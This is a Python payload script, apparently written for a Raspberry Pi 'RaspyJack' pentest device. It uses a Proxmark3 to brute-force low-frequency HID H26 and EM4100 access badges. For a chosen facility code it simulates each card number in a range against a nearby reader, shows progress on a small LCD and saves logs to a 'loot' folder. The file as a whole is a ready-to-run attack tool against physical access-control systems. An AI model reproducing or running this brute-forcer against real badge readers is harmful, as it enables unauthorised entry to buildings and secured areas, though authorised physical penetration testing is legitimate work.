#!/usr/bin/env python3
"""
RaspyJack Payload -- PM3 LF Brute
====================================
Brute-force HID/EM4100 badge IDs using Proxmark3 LF simulation.
Iterates card numbers for a given facility code, simulating each badge
on the PM3 antenna so a nearby reader will accept or reject it.

Controls:
  OK         Start / Stop brute-force
  UP/DOWN    Adjust selected value
  LEFT/RIGHT Switch field (FC / Start / End)
  KEY1       Switch mode (HID / EM4100)
  KEY2       Save brute log
  KEY3       Exit
"""

import os
import sys
import json
import time
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads.nfc_rfid._nfc_driver import auto_detect, PM3Driver

PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
        "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
LOOT_DIR = "/root/Raspyjack/loot/NFC/lf"
DEBOUNCE = 0.18
_last_btn = 0

MODES = ["HID", "EM4100"]


def _btn():
    global _last_btn
    b = get_button(PINS, GPIO)
    now = time.time()
    if b and now - _last_btn < DEBOUNCE:
        return None
    if b:
        _last_btn = now
    return b


def _save_log(mode, fc, cn_start, cn_end, tested, elapsed):
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"brute_{mode}_{ts}.json"
    entry = {
        "mode": mode, "facility_code": fc,
        "range_start": cn_start, "range_end": cn_end,
        "tested": tested, "elapsed_s": round(elapsed, 1),
        "timestamp": ts,
    }
    with open(os.path.join(LOOT_DIR, fname), "w") as f:
        json.dump(entry, f, indent=2)
    return fname


def main():
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font(10)
    font_sm = scaled_font(9)

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), "Detecting PM3...", font=font_sm, fill="#FFAA00")
    lcd.LCD_ShowImage(img, 0, 0)

    drv, drv_desc = auto_detect()
    if not isinstance(drv, PM3Driver):
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 40), "PM3 required!", font=font, fill="#FF4444")
        d.text((4, 60), drv_desc[:22], font=font_sm, fill="#888")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    mode_idx = 0
    fc = 0
    cn_start = 0
    cn_end = 100
    field = 0
    running = False
    status = drv_desc
    tested = 0
    start_time = 0

    try:
        while True:
            btn = _btn()
            if btn == "KEY3":
                if running:
                    running = False
                else:
                    break

            if not running:
                if btn == "KEY1":
                    mode_idx = (mode_idx + 1) % len(MODES)
                elif btn == "LEFT":
                    field = (field - 1) % 3
                elif btn == "RIGHT":
                    field = (field + 1) % 3
                elif btn == "UP":
                    if field == 0:
                        fc = (fc + 1) % 256
                    elif field == 1:
                        cn_start = min(cn_start + 10, 65534)
                    else:
                        cn_end = min(cn_end + 10, 65535)
                elif btn == "DOWN":
                    if field == 0:
                        fc = (fc - 1) % 256
                    elif field == 1:
                        cn_start = max(cn_start - 10, 0)
                    else:
                        cn_end = max(cn_end - 10, 1)
                elif btn == "KEY2":
                    if tested > 0:
                        elapsed = time.time() - start_time if start_time else 0
                        fname = _save_log(MODES[mode_idx], fc, cn_start, cn_end, tested, elapsed)
                        status = f"Saved: {fname[:16]}"

            if btn == "OK" and not running:
                running = True
                tested = 0
                start_time = time.time()
                current_cn = cn_start
                total = max(1, cn_end - cn_start + 1)
                mode = MODES[mode_idx]

                while running and current_cn <= cn_end:
                    tested += 1
                    pct = tested * 100 // total
                    elapsed = time.time() - start_time
                    speed = tested / max(0.1, elapsed)
                    eta = int((total - tested) / max(1, speed))

                    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                    d = ScaledDraw(img)
                    d.rectangle((0, 0, 127, 14), fill="#111")
                    d.text((2, 2), f"LF BRUTE {mode}", font=font_sm, fill="#FF4444")
                    d.text((90, 2), f"{pct}%", font=font_sm, fill="#FF4444")
                    if mode == "HID":
                        d.text((4, 20), f"FC:{fc} CN:{current_cn}", font=font_sm, fill="#FFAA00")
                    else:
                        d.text((4, 20), f"ID: {current_cn}", font=font_sm, fill="#FFAA00")
                    d.rectangle((4, 36, 123, 44), outline="#333")
                    bw = max(1, int(119 * tested / max(1, total)))
                    d.rectangle((4, 36, 4 + bw, 44), fill="#FF4444")
                    d.text((4, 50), f"{speed:.1f} cards/sec", font=font_sm, fill="#ccc")
                    d.text((4, 65), f"ETA: {eta}s ({tested}/{total})", font=font_sm, fill="#888")
                    d.text((4, 80), f"Elapsed: {int(elapsed)}s", font=font_sm, fill="#888")
                    d.text((4, 98), "KEY3 to stop", font=font_sm, fill="#555")
                    lcd.LCD_ShowImage(img, 0, 0)

                    if mode == "HID":
                        drv.command(f"lf hid sim -w H26 --fc {fc} --cn {current_cn}", timeout=3.0)
                    else:
                        em_id = f"{current_cn:010d}"
                        drv.command(f"lf em 410x sim --id {em_id}", timeout=3.0)

                    current_cn += 1

                    b2 = _btn()
                    if b2 == "KEY3":
                        running = False

                running = False
                elapsed = time.time() - start_time
                status = f"Done: {tested} in {int(elapsed)}s"

            if not running:
                img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                d = ScaledDraw(img)
                d.rectangle((0, 0, 127, 14), fill="#111")
                mode = MODES[mode_idx]
                d.text((2, 2), f"LF BRUTE {mode}", font=font_sm, fill="#FF4444")
                y = 20
                d.text((4, y), status[:24], font=font_sm, fill="#FFAA00")
                y += 14

                fields = [
                    ("FC", f"{fc}", field == 0),
                    ("Start", f"{cn_start}", field == 1),
                    ("End", f"{cn_end}", field == 2),
                ]
                for i, (label, val, sel) in enumerate(fields):
                    col = "#FF4444" if sel else "#888"
                    prefix = ">" if sel else " "
                    d.text((4, y), f"{prefix}{label}: {val}", font=font_sm, fill=col)
                    y += 12

                y += 5
                d.text((4, y), "^v:Adjust <>:Field", font=font_sm, fill="#888")
                y += 12
                d.text((4, y), "K1:Mode OK:Start", font=font_sm, fill="#888")

                d.rectangle((0, 116, 127, 127), fill="#111")
                d.text((2, 117), "OK:Go K1:Mode K3:X", font=font_sm, fill="#666")
                lcd.LCD_ShowImage(img, 0, 0)

            time.sleep(0.03)

    finally:
        if drv:
            drv.close()
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
